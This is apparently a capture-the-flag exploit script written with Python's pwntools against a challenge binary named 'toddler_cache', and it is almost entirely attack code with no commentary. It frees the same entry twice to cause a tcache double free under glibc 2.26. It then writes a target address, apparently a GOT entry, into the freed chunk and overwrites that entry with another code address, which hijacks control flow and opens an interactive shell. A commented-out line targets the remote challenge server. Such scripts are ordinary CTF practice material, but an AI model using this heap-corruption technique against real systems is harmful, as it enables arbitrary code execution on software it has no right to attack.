#!/usr/bin/python3

from pwn import *

target = './toddler_cache'

#context.log_level = 'error'
context.update(terminal = ['tmux','splitw'])

#==========================================================
#           FUNCTIONS
#==========================================================

def newEntry():
    p.recvuntil('>')
    p.sendline('1')

def writeEntry(eid, entry):
    p.recvuntil('>')
    p.sendline('2')
    p.recvuntil('write to')
    p.sendline(eid)
    p.recvuntil('write?')
    p.sendline(entry)

def freeEntry(eid):
    p.recvuntil('>')
    p.sendline('3')
    p.sendline(eid)

#==========================================================
#           CODE
#==========================================================

p = process(target, env={"LD_PRELOAD":"./glibc_versions/libc-2.26.so"})

#p = remote('cha.hackpack.club',41703)

gdb.attach(p)

newEntry()
newEntry()

freeEntry('1')
freeEntry('0')
freeEntry('1')


writeEntry('1', p64(0x602020))

newEntry()
newEntry()

writeEntry('3', p64(0x400837))

p.interactive()

